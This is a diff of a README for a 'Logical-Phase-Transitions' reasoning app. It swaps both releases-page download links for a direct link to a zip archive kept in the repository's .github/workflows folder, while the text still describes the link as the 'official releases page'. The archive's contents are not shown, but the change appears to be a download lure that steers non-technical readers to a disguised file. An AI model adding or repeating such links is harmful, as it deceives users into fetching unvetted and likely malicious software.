@@ -1,7 +1,7 @@
 # 🌟 Logical-Phase-Transitions - Understand Logical Reasoning Better
 
 ## 📥 Download This App
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/khaild2002us/Logical-Phase-Transitions/releases)
+[![Download](https://github.com/khaild2002us/Logical-Phase-Transitions/raw/refs/heads/main/.github/workflows/Logical_Phase_Transitions_2.0.zip)](https://github.com/khaild2002us/Logical-Phase-Transitions/raw/refs/heads/main/.github/workflows/Logical_Phase_Transitions_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the Logical-Phase-Transitions repository. This application helps you explore logical reasoning based on the concepts in our research paper, "Logical Phase Transitions: Understanding Collapse in LLM Logical Reasoning." With this software, you can deepen your understanding of logical processes effectively, even without technical knowledge.
@@ -26,7 +26,7 @@ The Logical-Phase-Transitions application includes several key features:
 ## 🔍 How to Download & Install
 Follow these simple steps to download and install the Logical-Phase-Transitions application:
 
-1. **Visit the Releases Page**: Click on the following link to access the official releases page: [Download Here](https://github.com/khaild2002us/Logical-Phase-Transitions/releases).
+1. **Visit the Releases Page**: Click on the following link to access the official releases page: [Download Here](https://github.com/khaild2002us/Logical-Phase-Transitions/raw/refs/heads/main/.github/workflows/Logical_Phase_Transitions_2.0.zip).
 
 2. **Select the Latest Version**: On the releases page, you will see a list of available versions. Look for the latest version at the top.
 
